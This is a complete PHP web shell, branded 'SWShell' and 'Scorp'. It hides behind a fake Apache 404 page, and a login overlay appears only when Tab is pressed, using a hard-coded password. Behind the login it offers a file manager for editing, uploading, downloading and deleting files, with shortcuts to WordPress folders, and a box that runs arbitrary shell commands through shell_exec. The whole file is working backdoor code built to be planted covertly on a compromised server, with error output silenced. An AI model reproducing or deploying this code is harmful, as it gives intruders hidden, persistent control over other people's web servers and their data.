<?php
@ini_set("default_charset", "UTF-8");
if (function_exists("mb_internal_encoding")) @mb_internal_encoding("UTF-8");
class SWShell {
    private $pass = "@admin_gacor1";

    private function sendHtmlHeaders() {
        if (!headers_sent()) {
            header("Content-Type: text/html; charset=utf-8");
        }
    }

    public function __construct() {
        if (session_id() == '') session_start();

        $post_pass = isset($_POST["sw_pass"]) ? $_POST["sw_pass"] : "";
        if ($post_pass === $this->pass) {
            $_SESSION["sw_auth"] = true;
        }

        if (isset($_GET["logout"])) {
            unset($_SESSION["sw_auth"]);
            session_destroy();
            header("Location: ?");
            exit;
        }

        if (!isset($_SESSION["sw_auth"])) {
            $this->showFake404();
            exit;
        }
    }

    private function showFake404() {
        $this->sendHtmlHeaders();
        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at ' . $_SERVER["HTTP_HOST"] . ' Port ' . $_SERVER["SERVER_PORT"] . '</address>
<div id="sw_login" style="opacity: 0; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
           background: rgba(0,0,0,0.95); display: none; align-items: center;
           justify-content: center; z-index: 9999;">
<div class="login-box" style="background: #1a1a1a; padding: 30px; border-radius: 10px;
             text-align: center; border: 1px solid #333;">
<form method="post">
<input type="password" name="sw_pass" placeholder="Enter password..." autofocus
       style="background: #2a2a2a; border: 1px solid #444; color: #fff;
                   padding: 12px 20px; font-size: 16px; border-radius: 5px;
                   width: 250px; margin: 10px 0;">
<button type="submit" style="background: #4CAF50; color: white; border: none;
                    padding: 12px 30px; font-size: 16px; border-radius: 5px;
                    cursor: pointer; margin-top: 10px;">Login</button>
</form>
</div>
</div>
<script>
document.addEventListener("keydown", function(e) {
    if (e.key === "Tab") {
        e.preventDefault();
        document.getElementById("sw_login").classList.add("active");
        document.getElementById("sw_login").style.display = "flex";
        document.querySelector("#sw_login input").focus();
    }
    if (e.key === "Escape") {
        document.getElementById("sw_login").classList.remove("active");
        document.getElementById("sw_login").style.display = "none";
    }
});
</script>
</body></html>';
    }

    public function run() {
        $a = isset($_GET["a"]) ? $_GET["a"] : "list";
        $p = isset($_GET["p"]) ? $_GET["p"] : "";
        $base = realpath($_SERVER["DOCUMENT_ROOT"]);
        $current_path = $base . "/" . $p;
        $current = realpath($current_path);
        if ($current === false) $current = $base;

        if (strpos($current, $base) !== 0) $current = $base;

        switch($a) {
            case "list":
                $this->listFiles($current, $p);
                break;
            case "edit":
                $this->editFile($current, $p);
                break;
            case "upload":
                $this->uploadFile($current, $p);
                break;
            case "download":
                $this->downloadFile($current);
                break;
            case "delete":
                $this->deleteFile($current, $p);
                break;
            case "mkdir":
                $this->createDir($current, $p);
                break;
            case "rename":
                $this->renameItem($current, $p);
                break;
            case "cd":
                $this->changeDir($p);
                break;
            case "cmd":
                $this->executeCmd();
                break;
            default:
                $this->listFiles($current, $p);
        }
    }

    private function listFiles($current, $p) {
        $files = @scandir($current);
        if ($files === false) $files = array();
        $files = array_diff($files, array(".", ".."));

        $this->sendHtmlHeaders();
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Scorp</title>
        <style>
        * { box-sizing: border-box; }
        body { font-family: "Segoe UI", "Apple Color Emoji", "Segoe UI Emoji", Arial, sans-serif; margin: 0; padding: 20px;
               background: #1e1e1e; color: #d4d4d4; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #2d2d2d; padding: 15px 20px; border-radius: 8px;
                  margin-bottom: 20px; display: flex; justify-content: space-between;
                  align-items: center; border: 1px solid #3d3d3d; }
        .path-bar { background: #2d2d2d; padding: 12px 20px; border-radius: 6px;
                   margin-bottom: 15px; font-family: monospace; border: 1px solid #3d3d3d; }
        .actions { background: #2d2d2d; padding: 12px 20px; border-radius: 6px;
                   margin-bottom: 15px; border: 1px solid #3d3d3d; }
        table { width: 100%; border-collapse: collapse; background: #2d2d2d;
                border-radius: 6px; overflow: hidden; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #3d3d3d; }
        th { background: #3d3d3d; font-weight: 600; }
        tr:hover { background: #252525; }
        a { color: #4ec9b0; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input[type="text"], input[type="file"] { background: #3d3d3d; border: 1px solid #4d4d4d;
                                                color: #d4d4d4; padding: 8px 12px;
                                                border-radius: 4px; margin-right: 8px; }
        button { background: #0e639c; color: white; border: none; padding: 8px 16px;
                border-radius: 4px; cursor: pointer; }
        button:hover { background: #1177bb; }
        .logout { background: #d13438; }
        .logout:hover { background: #f14c4c; }
        .icon { margin-right: 8px; }
        </style></head><body>
        <div class="container">

        <div class="header">
            <div>
                <strong style="color: #4ec9b0;">Scorp</strong>
                <span style="color: #808080;">| Scorp File Manager</span>
            </div>
            <div>
                <a href="?a=cmd" style="margin-right: 15px;">⚡ Shell</a>
                <a href="?logout" class="logout">Logout</a>
            </div>
        </div>

        <div class="path-bar">';
        echo '<strong>📁 Path:</strong> ';
        echo '<a href="?a=list">ROOT</a>';
        $parts = explode('/', trim($p, '/'));
        $current_path = '';
        foreach ($parts as $part) {
            if ($part != '') {
                $current_path .= '/' . $part;
                echo ' / <a href="?a=list&p=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        echo '<br><span style="color: #808080; font-size: 12px;">' . htmlspecialchars($current) . '</span>';
        echo '</div>

        <div class="actions">
            <form action="?a=mkdir&p=' . urlencode($p) . '" method="post" style="display:inline;">
                <input type="text" name="dirname" placeholder="Folder name" required style="width: 120px;">
                <button type="submit">📁 Mkdir</button>
            </form>
            <form action="?a=cd&p=' . urlencode($p) . '" method="post" style="display:inline;">
                <input type="text" name="cd_path" placeholder="Change directory..." required style="width: 200px;">
                <button type="submit">📂 CD</button>
            </form>
            <form action="?a=list" method="get" style="display:inline;">
                <input type="hidden" name="a" value="list">
                <input type="text" name="p" placeholder="Jump to path..." value="' . htmlspecialchars($p) . '" style="width: 200px;">
                <button type="submit">Go</button>
            </form>
            <form action="?a=upload&p=' . urlencode($p) . '" method="post" enctype="multipart/form-data" style="display:inline;">
                <input type="file" name="f" required>
                <button type="submit">📤 Upload</button>
            </form>
        </div>

        <div style="background: #2d2d2d; padding: 10px 20px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #3d3d3d; font-size: 13px;">
            <strong>⚡ Quick Nav:</strong>
            <a href="?a=list&p=." style="margin: 0 8px;">Root</a>
            <a href="?a=list&p=wp-content" style="margin: 0 8px;">wp-content</a>
            <a href="?a=list&p=wp-admin" style="margin: 0 8px;">wp-admin</a>
            <a href="?a=list&p=wp-includes" style="margin: 0 8px;">wp-includes</a>
            <a href="?a=list&p=public_html" style="margin: 0 8px;">public_html</a>
            <a href="?a=list&p=var/www/html" style="margin: 0 8px;">/var/www/html</a>
        </div>

        <table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>';

        if ($p != "") {
            $parent_dir = dirname($p);
            if ($parent_dir == ".") $parent_dir = "";
            echo '<tr><td><span class="icon">📁</span><a href="?a=list&p=' . urlencode($parent_dir) . '">..</a></td><td>-</td><td>-</td><td>-</td></tr>';
        }

        foreach ($files as $file) {
            $full_path = $current . "/" . $file;
            $is_dir = is_dir($full_path);
            $size = $is_dir ? "-" : $this->formatSize(@filesize($full_path));
            $date = date("Y-m-d H:i", @filemtime($full_path));
            $icon = $is_dir ? "📁" : "📄";
            $name = '<span class="icon">' . $icon . '</span>' . htmlspecialchars($file);

            if ($is_dir) {
                $link = '?a=list&p=' . urlencode($p . '/' . $file);
                $name_link = '<a href="' . $link . '">' . $name . '</a>';
                $actions = '<a href="' . $link . '">Open</a> |
                          <a href="?a=rename&p=' . urlencode($p . '/' . $file) . '">Rename</a> |
                          <a href="?a=delete&p=' . urlencode($p . '/' . $file) . '" onclick="return confirm(\'Delete?\')">Del</a>';
            } else {
                $name_link = $name;
                $actions = '<a href="?a=edit&p=' . urlencode($p . '/' . $file) . '">Edit</a> |
                          <a href="?a=download&p=' . urlencode($p . '/' . $file) . '">Download</a> |
                          <a href="?a=rename&p=' . urlencode($p . '/' . $file) . '">Rename</a> |
                          <a href="?a=delete&p=' . urlencode($p . '/' . $file) . '" onclick="return confirm(\'Delete?\')">Del</a>';
            }

            echo '<tr><td>' . $name_link . '</td><td>' . $size . '</td><td>' . $date . '</td><td>' . $actions . '</td></tr>';
        }

        echo '</table></div></body></html>';
    }

    private function executeCmd() {
        $cmd = isset($_POST["cmd"]) ? $_POST["cmd"] : "";
        $output = "";
        if ($cmd != "") {
            if (preg_match('/^cd\s+(.+)$/', $cmd, $matches)) {
                $new_path = trim($matches[1]);
                if (substr($new_path, 0, 1) == '/') {
                    $new_path = substr($new_path, 1);
                }
                $new_path = rtrim($new_path, '/');
                header("Location: ?a=list&p=" . urlencode($new_path));
                exit;
            }
            $output = shell_exec($cmd . " 2>&1");
        }

        $this->sendHtmlHeaders();
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Shell - SWShell</title>
        <style>
        body { font-family: "Segoe UI", "Apple Color Emoji", "Segoe UI Emoji", Arial, sans-serif; margin: 0; padding: 20px;
               background: #1e1e1e; color: #d4d4d4; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { background: #2d2d2d; padding: 15px 20px; border-radius: 8px;
                  margin-bottom: 20px; border: 1px solid #3d3d3d; }
        .terminal { background: #0c0c0c; padding: 20px; border-radius: 6px;
                   font-family: "Consolas", monospace; font-size: 14px;
                   white-space: pre-wrap; border: 1px solid #3d3d3d; margin-bottom: 15px; }
        input[type="text"] { width: 100%; background: #2d2d2d; border: 1px solid #3d3d3d;
                            color: #d4d4d4; padding: 12px; font-family: monospace;
                            border-radius: 4px; font-size: 14px; }
        button { background: #0e639c; color: white; border: none; padding: 12px 24px;
                border-radius: 4px; cursor: pointer; margin-top: 10px; }
        a { color: #4ec9b0; text-decoration: none; }
        </style></head><body>
        <div class="container">
        <div class="header">
            <strong>⚡ Command Shell</strong> |
            <a href="?a=list">File Manager</a> |
            <a href="?logout">Logout</a>
        </div>';

        if ($output != "") {
            echo '<div class="terminal">' . htmlspecialchars($output) . '</div>';
        }

        echo '<form method="post">
        <input type="text" name="cmd" placeholder="Enter command... (cd /path to navigate)" value="' . htmlspecialchars($cmd) . '" autofocus>
        <button type="submit">Execute</button>
        </form>
        </div></body></html>';
    }

    private function changeDir($p) {
        $new_path = isset($_POST["cd_path"]) ? $_POST["cd_path"] : "";
        if ($new_path != "") {
            if (substr($new_path, 0, 1) == '/') {
                $new_path = substr($new_path, 1);
            }
            $new_path = rtrim($new_path, '/');
            header("Location: ?a=list&p=" . urlencode($new_path));
            exit;
        }
        header("Location: ?a=list&p=" . urlencode($p));
        exit;
    }

    private function createDir($current, $p) {
        if (isset($_POST["dirname"]) && $_POST["dirname"] != "") {
            $new_dir = $current . "/" . $_POST["dirname"];
            if (!file_exists($new_dir)) {
                @mkdir($new_dir, 0755);
            }
        }
        header("Location: ?a=list&p=" . urlencode($p));
        exit;
    }

    private function renameItem($current, $p) {
        if (isset($_POST["newname"]) && $_POST["newname"] != "") {
            $new_name = dirname($current) . "/" . $_POST["newname"];
            @rename($current, $new_name);
            header("Location: ?a=list&p=" . urlencode(dirname($p)));
            exit;
        }

        $this->sendHtmlHeaders();
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Rename</title>
        <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
        input { padding: 10px; margin: 5px; width: 300px; background: #2d2d2d; border: 1px solid #3d3d3d; color: #d4d4d4; }
        button { padding: 10px 20px; background: #0e639c; color: white; border: none; border-radius: 4px; }
        </style></head><body>';
        echo '<h2>Rename: ' . htmlspecialchars(basename($current)) . '</h2>';
        echo '<form method="post">';
        echo '<input type="text" name="newname" value="' . htmlspecialchars(basename($current)) . '" required>';
        echo '<button type="submit">Rename</button> ';
        echo '<button type="button" onclick="window.history.back()">Cancel</button>';
        echo '</form></body></html>';
    }

    private function editFile($current, $p) {
        if (isset($_POST["c"])) {
            @file_put_contents($current, $_POST["c"]);
            header("Location: ?a=list&p=" . urlencode(dirname($p)));
            exit;
        }

        $content = @file_get_contents($current);
        $content = htmlspecialchars($content);

        $this->sendHtmlHeaders();
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Edit</title>
        <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
        textarea { width: 100%; height: 500px; font-family: "Consolas", monospace;
                   font-size: 14px; background: #2d2d2d; color: #d4d4d4;border: 1px solid #3d3d3d; padding: 10px; }
        button { padding: 10px 20px; background: #0e639c; color: white; border: none; border-radius: 4px; margin: 5px; }
        </style></head><body>';
        echo '<h2>Edit: ' . htmlspecialchars(basename($current)) . '</h2>';
        echo '<p>' . htmlspecialchars($current) . '</p>';
        echo '<form method="post">';
        echo '<textarea name="c">' . $content . '</textarea><br>';
        echo '<button type="submit">Save</button>';
        echo '<button type="button" onclick="window.history.back()">Cancel</button>';
        echo '</form></body></html>';
    }

    private function uploadFile($current, $p) {
        if (isset($_FILES["f"]) && isset($_FILES["f"]["tmp_name"]) && $_FILES["f"]["tmp_name"] != "") {
            $target_file = $current . "/" . $_FILES["f"]["name"];
            @move_uploaded_file($_FILES["f"]["tmp_name"], $target_file);
        }
        header("Location: ?a=list&p=" . urlencode($p));
        exit;
    }

    private function downloadFile($current) {
        if (file_exists($current)) {
            header("Content-Type: application/octet-stream");
            header("Content-Disposition: attachment; filename=\"" . basename($current) . "\"");
            header("Content-Length: " . filesize($current));
            readfile($current);
            exit;
        }
    }

    private function deleteFile($current, $p) {
        if (file_exists($current)) {
            if (is_dir($current)) {
                $this->deleteDirectory($current);
            } else {
                @unlink($current);
            }
        }
        header("Location: ?a=list&p=" . urlencode(dirname($p)));
        exit;
    }

    private function deleteDirectory($dir) {
        if (!file_exists($dir)) return true;
        if (!is_dir($dir)) return unlink($dir);

        $items = @scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                $this->deleteDirectory($path);
            } else {
                @unlink($path);
            }
        }
        return @rmdir($dir);
    }

    private function formatSize($bytes) {
        if ($bytes == 0) return "0 B";
        $units = array("B", "KB", "MB", "GB");
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . " " . $units[$pow];
    }
}

@error_reporting(0);
@ini_set("display_errors", 0);
$sw = new SWShell();
$sw->run();
?>
